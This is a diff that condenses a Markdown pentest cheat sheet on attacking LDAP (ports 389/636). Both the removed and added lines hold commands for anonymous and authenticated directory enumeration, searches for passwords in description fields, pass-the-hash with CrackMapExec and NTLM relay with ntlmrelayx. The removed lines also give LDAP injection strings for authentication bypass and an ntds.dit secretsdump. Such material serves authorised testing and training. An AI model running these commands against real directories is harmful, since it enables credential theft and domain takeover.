@@ -1,244 +1,69 @@
-# Lightweight Directory Access Protocol (LDAP) – Ports 389/636
+# LDAP (389, 636)
 
 !!! tip "Start here"
-    `ldapsearch -x -H ldap://<target> -b "DC=domain,DC=local"` with anonymous bind — if it returns data, you have unauthenticated enumeration. Common on misconfigured internal AD environments.
-
-!!! warning "Watch out"
-    LDAP port 389 vs LDAPS 636 — if 389 is filtered, try 636. Some environments only expose the encrypted port externally.
-
-## Port Scanning and Enumeration
-
-### Basic Nmap Scan
-
-```bash
-nmap -p 389,636 $IP --script ldap-rootdse,ldap-search
-```
-### Comprehensive Nmap Scan
-```bash
- nmap -n -sV --script "ldap* and not brute" $IP
-```
-### NSE Scripts to Use
-
-- `ldap-rootdse`: Queries the Root DSE (directory service entry).
-    
-- `ldap-search`: Performs an anonymous search.
-    
-- `ldap-novell-getpass`: Novell-specific password grabbing.
-    
-- `ldap-brute`: Brute-forces LDAP login credentials.
-    
+    Try anonymous bind first: `ldapsearch -x -H ldap://10.10.10.10 -b "dc=example,dc=com"`. If it returns data you have unauthenticated enumeration of the entire directory — usernames, computers, group memberships, sometimes passwords in description fields.
 
 ---
 
-## LDAP Basics
+## Enumeration
 
-### Bind Types
-
-- **Anonymous Bind**: No credentials used. Sometimes permitted for read-only access.
-    
-- **Simple Bind**: Username and password (often DN format).
-    
-- **SASL Bind**: Supports Kerberos and NTLM (common in AD environments).
-    
-
-### DN (Distinguished Name) Format
-
-```text
-cn=John Doe,ou=Users,dc=corp,dc=local
+```bash
+nmap -p 389,636 --script ldap-rootdse,ldap-search 10.10.10.10
+nmap -n -sV --script "ldap* and not brute" 10.10.10.10
 ```
 
 ---
 
-## Anonymous and Authenticated Enumeration
-
-### Enum Users and Info (Using ldapsearch)
-
-Anonymous bind:
+## Anonymous Bind
 
 ```bash
-ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local"
-```
-
-Authenticated bind:
-
-```bash
-ldapsearch -x -H ldap://$IP -D 'user@domain.com' -w 'password' -b "dc=corp,dc=local"
-```
-
-Dump user objects only:
-
-```bash
-ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName
-```
-
-List domain computers:
-
-```bash
-ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(objectClass=computer)" cn
-```
-
-Extract DNS hostnames:
-
-```bash
-ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(dnshostname=*)" dnshostname
+ldapsearch -x -H ldap://10.10.10.10 -b "dc=example,dc=com"
 ```
 
 ---
 
-## LDAP Injection
-
-### Vulnerable Pattern
-
-When user-controlled input is used to construct LDAP queries:
-
-```python
-search_filter = "(uid=" + user_input + ")"
-```
-
-### Exploitable Payloads
-
-Attempt to bypass filters:
-
-- `*` – wildcard search
-    
-- `*)(uid=*)` – injects second condition
-    
-- `*)(objectClass=*)` – broad search
-    
-- `*)(!(uid=*))` – logic negation
-    
-
-Example of injection to bypass auth:
-
-```text
-username=*)(uid=*) 
-```
-
-Can lead to:
-
-- Authentication bypass
-    
-- Unauthorized data exposure
-    
-- DoS via complex filter injection
-    
-
----
-
-## Credential Hunting in LDAP
-
-Look for these attributes:
-
-- `userPassword`
-    
-- `unicodePwd`
-    
-- `sAMAccountName`
-    
-- `lastLogonTimestamp`
-    
-- `description` (sometimes used to store passwords)
-    
-- `pwdLastSet` (used for password spraying windows)
-    
-
-Example to search password attributes:
+## Authenticated Enumeration
 
 ```bash
-ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(objectClass=person)" userPassword
-```
+# All users
+ldapsearch -x -H ldap://10.10.10.10 -D 'user@example.com' -w '<pass>' \
+  -b "dc=example,dc=com" "(objectClass=user)" sAMAccountName
 
-Search for plaintext in `description` fields:
+# All computers
+ldapsearch -x -H ldap://10.10.10.10 -D 'user@example.com' -w '<pass>' \
+  -b "dc=example,dc=com" "(objectClass=computer)" cn
 
-```bash
-ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(description=*)" description
+# Admin accounts (adminCount=1)
+ldapsearch -x -H ldap://10.10.10.10 -D 'user@example.com' -w '<pass>' \
+  -b "dc=example,dc=com" "(&(objectClass=user)(adminCount=1))" sAMAccountName
+
+# Domain Admins group membership
+ldapsearch -x -H ldap://10.10.10.10 -D 'user@example.com' -w '<pass>' \
+  -b "dc=example,dc=com" "(memberOf=CN=Domain Admins,CN=Users,DC=example,DC=com)" sAMAccountName
+
+# Passwords stored in description fields
+ldapsearch -x -H ldap://10.10.10.10 -D 'user@example.com' -w '<pass>' \
+  -b "dc=example,dc=com" "(description=*)" sAMAccountName description
 ```
 
 ---
 
-## Pivoting and Lateral Movement
-
-Once LDAP access is obtained:
-
-- Extract valid usernames for password spraying or Kerberos pre-auth attacks (AS-REP roasting).
-    
-- Combine with SMB enumeration (`enum4linux`, `crackmapexec`) to identify systems where users are local admins.
-    
-- Identify admin groups:
-    
-    ```bash
-    ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(memberOf=*)" memberOf
-    ```
-    
-
----
-
-## LDAP Query Examples
-
-### Find All Users
+## CrackMapExec
 
 ```bash
-ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName
-```
-
-### Find Members of a Group
-
-```bash
-ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)" sAMAccountName
-```
-
-### Search Users With Admin Rights
-
-```bash
-ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(&(objectCategory=person)(objectClass=user)(adminCount=1))" sAMAccountName
+crackmapexec ldap 10.10.10.10 -u <user> -p <pass> --users
+crackmapexec ldap 10.10.10.10 -u <user> -H <hash>
 ```
 
 ---
 
-## Tools for LDAP Attacks
+## NTLM Relay to LDAP
 
-### ldapsearch (Linux)
-
-```bash
-apt install ldap-utils
-```
-
-### CrackMapExec
+If you capture NTLMv2 hashes via LLMNR/NBT-NS poisoning, relay them to LDAP:
 
 ```bash
-crackmapexec ldap $IP -u usernames.txt -p passwords.txt
+ntlmrelayx.py -t ldap://10.10.10.10 --dump
 ```
 
-### Enum4Linux (For SMB + LDAP Enumeration)
-
-```bash
-enum4linux-ng $IP
-```
-
-### ADExplorer (GUI, by Sysinternals – for offline analysis of LDAP dumps)
-
----
-
-## Additional Tactics
-
-### Dump LDAP via Ntds.dit and SYSTEM Hive (Post-Exploitation)
-
-If Domain Controller is compromised:
-
-```bash
-secretsdump.py -just-dc -system SYSTEM -ntds ntds.dit LOCAL
-```
-
-### Pass-the-Hash with LDAP
-
-```bash
-crackmapexec ldap $IP -u <user> -H <NTLM hash>
-```
-
-### Gaining Access via LLMNR/NTLM Relay to LDAP
-
-```bash
-ntlmrelayx.py -t ldap://$IP --dump
-```
-
-This will dump LDAP contents if the victim account has privileges.
+!!! tip "Real-world"
+    Anonymous LDAP is still common on internal AD environments — it's rarely intentional, usually a misconfiguration from legacy requirements. Even with credentials, `description` fields are a reliable place to find passwords that sysadmins embedded years ago. Pull the full dump and grep it offline rather than running targeted queries.
